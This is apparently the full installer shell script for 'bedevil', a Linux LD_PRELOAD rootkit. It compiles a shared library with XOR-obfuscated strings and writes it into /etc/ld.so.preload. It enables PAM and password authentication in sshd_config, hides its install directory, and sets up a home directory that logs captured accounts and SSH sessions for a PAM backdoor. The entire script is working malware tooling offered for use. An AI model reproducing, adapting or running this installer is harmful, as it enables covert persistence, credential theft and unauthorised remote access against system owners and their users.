#!/bin/bash

tty -s && clear
[ -f .ascii ] && printf "\e[1m\e[31m`cat .ascii`\e[0m\n"

verb() { [ $VERBOSE = 1 ] && printf "\e[6m$1\e[0m\n"; }
wecho() { printf " \e[33m[!]\e[0m $1\n"; }
eecho() { printf " \e[31m[!]\e[0m $1\n"; }
secho() { printf " \e[32m[+]\e[0m $1\n"; }
necho() { printf " [..] $1\n"; }

[ $(id -u) != 0 ] && { eecho "You do not have root privileges, your actions are limited"; NOT_ROOT=1; }
[ -e /proc ] || { eecho "/proc doesn't exist. May I suggest bailing?"; exit; }
[ `which gcc` ] || { eecho "GCC not found"; exit; }
[ -f /etc/ssh/sshd_config ] || { eecho "/etc/ssh/sshd_config not present"; exit; }
[[ $(cat /etc/syslinux/config 2>/dev/null | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]] && eecho "SELinux detected (enforcing)"

[ -d /proc/xen ] && wecho "Xen environment detected"
[ -d /proc/vz ] && wecho "OpenVZ environment detected"
[ -f /usr/bin/lveps ] && wecho "CloudLinux LVE detected"
[[ $(cat /proc/scsi/scsi 2>/dev/null | grep 'VBOX') == *"VBOX"* ]] && wecho "VirtualBox VM detected"

# default values for settings. (can/will be changed later...)
[ -z $MGID ] && MGID=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1`
[ -z $IDIR ] && IDIR="$(bash etc/get_recurdir.sh)/.$RANDOM"
[ -z $BD_ENV ] && BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
[ -z $SSH_LOGS ] && SSH_LOGS="$(bash etc/get_recurdir.sh)/.$RANDOM"
[ -z $BDVLSO ] && BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so"
[ -z $MDIR ] && MDIR="symbols"
[ -z $NEW_MDIR ] && NEW_MDIR="${BDVLSO}.$MDIR"
[ -z $PLATFORM ] && PLATFORM="`uname -m`"

declare -a array YUM_DEPS=("gcc" "pam-devel" "newt" "libgcc.i686" "glibc-devel.i686" "glibc-devel" "libpcap" "libpcap-devel" "vim-common")
declare -a array APT_DEPS=("libpam-dev" "libpcap-dev" "gcc-multilib" "build-essential")
declare -a array PAC_DEPS=("pam" "libpcap" "base-devel")
declare -a array CFILES=(".ascii" "etc/ssh.sh" "etc/eutils.sh" "etc/README") # files to copy over to the install dir

asc() { printf '%d' "'$1"; }
xenc()
{
    local din ptr dout val1
    din=$1
    for (( ptr=0;ptr<${#din};ptr++ )); do
        val1=$(asc "${din:$ptr:1}")
        dout+=$(printf '\\\\x%02x' "$((val1 ^ 0xac))")
    done
    echo -n "$dout"
}

crypt_password()
{
    [ `which python3` ] && { echo -n `python3 -c "import crypt; print(crypt.crypt(\"$1\"))"`; return; }
    echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
}

patch_libdl()
{
    necho "Patching dynamic linker libraries"
    LDSO_PRELOAD="$(etc/plibdl.sh $LDSO_PRELOAD)"
    secho "New ld.so.preload location: $LDSO_PRELOAD"
}

cleanup_bdvl()
{
    secho "Cleaning up local mess"
    rm -rf $NEW_MDIR bdvl.c *.so.*
}

install_deps()
{
    necho "Installing dependencies"
    [ -f /usr/bin/yum ] && yum install -y -q -e 0 "${YUM_DEPS[*]}" &>/dev/null
    [ -f /usr/bin/pacman ] && { pacman -Syy &>/dev/null && pacman -S --noconfirm "${PAC_DEPS[*]}" &>/dev/null; }
    if [ -f /usr/bin/apt-get ]; then
        dpkg --add-architecture i386 &>/dev/null
        yes | apt-get update &>/dev/null
        apt-get --yes --force-yes install "${APT_DEPS[*]}" &>/dev/null
        [ ! -z "$(apt-cache search libpcap0.8-dev)" ] && apt-get --yes --force-yes install libpcap0.8-dev &>/dev/null
        grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
    fi
}

build_char_array()
{
    local nam arr carr asize
    nam=$1; arr=$2
    asize="#define `echo -n ${nam} | awk '{print toupper($0)}'`_SIZE $3"
    carr="\n${asize}\nstatic char *${nam}[`echo -n ${asize} | awk '{print $2}'`] = {"
    for e in ${arr[@]}; do carr+="\"`xenc $e`\","; done
    echo -n "${carr::-1}};\n"
}

write_char_arrays()
{
    necho "Building & writing C char arrays for the lib headers"

    local carray_contents array_name array_elements final_char_arrays
    carray_contents=("$(cat $NEW_MDIR/char_arrays)")
    for current_array in $carray_contents; do
        IFS=':' read -a array_creds <<< "$current_array"
        array_name="${array_creds[0]}" # name of char array
        array_elements="${array_creds[1]}" # elements of array

        # sort elements into a list and build our char array
        IFS=',' read -a split_array_elements <<< "$array_elements"
        final_char_arrays+="`build_char_array $array_name "${split_array_elements[*]}" ${#split_array_elements[*]}`"

        # if the current array isn't an array of symbol names, go next line.
        [[ $array_name != *"_calls"* ]] && continue
        # otherwise, add the symbols in the current array to HOOKS
        for current_hook in ${split_array_elements[@]}; do HOOKS+=("$current_hook"); done
    done
    
    # make a char array of all of the symbol names we got, and define index references for each symbol name
    final_char_arrays+="`build_char_array "all" "${HOOKS[*]}" ${#HOOKS[*]}`"
    for i in "${!HOOKS[@]}"; do final_char_arrays+="#define C`echo ${HOOKS[i]} | awk '{print toupper($0)}'` $i\n"; done

    printf "\n$final_char_arrays\n" >> $NEW_MDIR/headers/rk_creds.h
}

write_sconsts()
{
    local stconsts cconsts cname cval
    stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"

    necho "Writing background variables"
    while read -r line; do
        IFS=':' read -a pline <<< "$line" # seperate name and value on line
        cname=${pline[0]} # const name
        cval=${pline[1]} # const value
        [ $cval == $cname ] && cconsts+="#define $cname \"`xenc ${!cval}`\"\n" # reference variable in this script by the const value
        [ $cval != $cname ] && cconsts+="#define $cname \"`xenc $cval`\"\n" # we already have a suitable value, use that
    done <<< "$stconsts"

    printf "\n$cconsts\n#endif" >> $NEW_MDIR/headers/rk_creds.h
}

start_config_wizard()
{
    necho "Finding variable placeholders"
    local HDC CVAR
    HDC=("$(cat $MDIR/headers/rk_creds.h)")
    for w in $HDC; do
        CVAR=`echo $w | grep "??"`
        [ -z $CVAR ] && continue
        [[ $CVAR == *"\""* ]] && { STR_VARS+=($CVAR); continue; }
        INT_VARS+=($CVAR)
    done

    echo
    secho "Beginning the main user config wizard"
    necho "You will want to change a couple of the default input settings"
    echo

    local input varname
    for var in ${STR_VARS[*]}; do
        input="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n 1`"

        eval "varname=\"`printf ${var} | tr -d '\"\?,'`\""
        [ ! -z "`printf "${!varname}"`" ] && input=${!varname}

        read -p " [..] Variable input for ${varname} [$input]: "
        [ ! -z $REPLY ] && input=$REPLY

        [ ! -z "`printf "$varname"`" ] && eval "$varname=\"$input\""
        [[ "$var" == *"BD_PWD"* ]] && input="$(crypt_password $input)"
        PSETTINGS+="\"`xenc $input`\":$var "
    done

    for var in ${INT_VARS[*]}; do
        input=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1`

        eval "varname=\"`printf ${var} | tr -d '\?'`\""
        [ ! -z "`printf "${!varname}"`" ] && input=${!varname}
        
        read -p " [..] Variable input for ${varname} [$input]: "
        [ ! -z $REPLY ] && input=$REPLY

        [ ! -z "`printf "$varname"`" ] && eval "$varname=$input"
        PSETTINGS+="$input:$var "
    done

    SOPATH="$IDIR/$BDVLSO.$PLATFORM"
    secho "Configuration finished\n"
    verb $PSETTINGS
}

populate_new_placeholders()
{
    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }

    write_char_arrays
    start_config_wizard
    write_sconsts

    necho "Overwriting variable placeholders with new settings"
    IFS=' ' read -a PSETTING <<< "$PSETTINGS" # parse current placeholder setting
    for ps in ${PSETTING[@]}; do
        IFS=':' read -a cps <<< "$ps"
        local cx=$(printf ''${cps[0]}'' )
        verb "cps[0]=${cps[0]}" # new value
        verb "cps[1]=${cps[1]}" # old placeholder
        sed -i "s/${cps[1]}/${cx//x/'\\'\x}/g" $NEW_MDIR/headers/rk_creds.h
    done
}

build_bdvlc()
{
    local all_includes bdvlc
    while read -r line; do all_includes+="#include $line\n"; done <<< "`cat "$MDIR/std_includes" | grep -o '^[^#]*' && cat "$MDIR/symbol_includes" | grep -o '^[^#]*'`"

    bdvlc="#define _GNU_SOURCE
$all_includes
`cat "$MDIR/prehook.c"`"
    printf "$bdvlc" > bdvl.c
}

compile_bdvl()
{
    [ ! -d "$NEW_MDIR" ] && { eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
    
    local WARNING_FLAGS OPTIMIZATION_FLAGS OPTIONS LINKER_OPTIONS LINKER_FLAGS
    WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
    OPTIMIZATION_FLAGS="-O0 -g0"
    OPTIONS="-fomit-frame-pointer -fPIC"
    LINKER_OPTIONS="-Wl,--build-id=none"
    LINKER_FLAGS="-ldl -lcrypt"

    rm -f *.so.* 2>/dev/null
    gcc -std=gnu99 $OPTIMIZATION_FLAGS bdvl.c $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
    gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS bdvl.c $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
    strip -s $BDVLSO.$PLATFORM || { eecho "Couldn't strip library, exiting"; exit; }
    [ -f $BDVLSO.i686 ] && strip -s $BDVLSO.i686

    secho "Shared library compiled. ($BDVLSO.$PLATFORM $(ls -lhN $BDVLSO.$PLATFORM | awk '{print $5}'))" && rm -f bdvl.c
}

install_bdvl()
{
    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root, exiting"; exit; }

    secho "Starting full installation!\n"

    wecho "Do you want to patch the dynamic linker?"
    wecho "If you are doing this, you need to do this now"
    read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
    [[ $REPLY =~ ^[Yy]$ ]] && patch_libdl
    echo

    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
    [[ $REPLY =~ ^[Yy]$ ]] && install_deps
    echo

    populate_new_placeholders
    build_bdvlc
    compile_bdvl
    
    # now we have to install the library and make sure it is present in ld.so.preload
    necho "Installing $BDVLSO to $IDIR"
    mkdir -p $IDIR/
    cp $BDVLSO.$PLATFORM $SOPATH
    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null

    [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
    [ "$(cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes')" == "PasswordAuthentication yes" ] || sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config

    necho "Pointing $LDSO_PRELOAD to $SOPATH"
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
    echo -n $SOPATH > $LDSO_PRELOAD
    secho "Installation successful"
    cleanup_bdvl
    echo

    setup_home $IDIR
    secho "Your PAM backdoor is set up"
    secho "See 'etc/ssh.sh' on connecting with your hidden port"
}

setup_home()
{
    export ${BD_ENV}=1
    local LBASHRC="$1/.bashrc"
    local RBASHRC="tty -s || return
[ ! -z \$TERM ] && export TERM=xterm
[ \$(id -u) != 0 ] && su root
[ \$(id -u) != 0 ] && kill -9 \$\$
[ -f ~/etc/README ] && cat ~/etc/README | less && rm ~/etc/README

clear
[ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"

export PATH=\"\$PATH:~/etc\"
alias ls='ls --color=auto'
alias ll='ls --color=auto -AlFhn'

id; who
[ ! -f ~/auth_logs ] && touch ~/auth_logs
echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\"
echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
    echo '. .bashrc' > "$1/.profile"
    echo "$RBASHRC" > $LBASHRC

    mkdir $1/etc
    for f in ${CFILES[@]}; do cp $f $1/$f; done

    necho "Hiding rootkit files"
    touch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
    chown 0:$MGID $LDSO_PRELOAD $SSH_LOGS $1 $1/* $1/.profile $1/.bashrc $1/.ascii
}

OPTIND=1
VERBOSE=0

HELPMSG="
  Usage: $0 [ -h | -v | -d | -b | -c | -C | -D | -i]
        -h: Show this help message and exit.
        -v: Toggle verbose output.
        -d: Populate rootkit headers with user data.
        -b: Make bdvl.c.
        -c: Compile rootkit library in current directory and exit.
        -C: Clean up installation/compilation mess and exit.
        -D: Install all potential required dependencies.
        -i: Launch full installation of bedevil. You will be
            prompted for input when needed.
"

while getopts "h?vdpcCbiD" opt; do
    case "$opt" in
    h)
        echo "$HELPMSG" && exit
        ;;
    v)
		secho "Running in verbose mode"; VERBOSE=1
        ;;
    d)  
        populate_new_placeholders
        ;;
    p)  
        start_config_wizard
        echo $PSETTINGS > example_config
        exit
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        exit
        ;;
    b)
        build_bdvlc
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        install_deps
        ;;
    ?)
        echo "$HELPMSG" && exit
        ;;
    esac
done

[ -z $1 ] && echo "$HELPMSG"
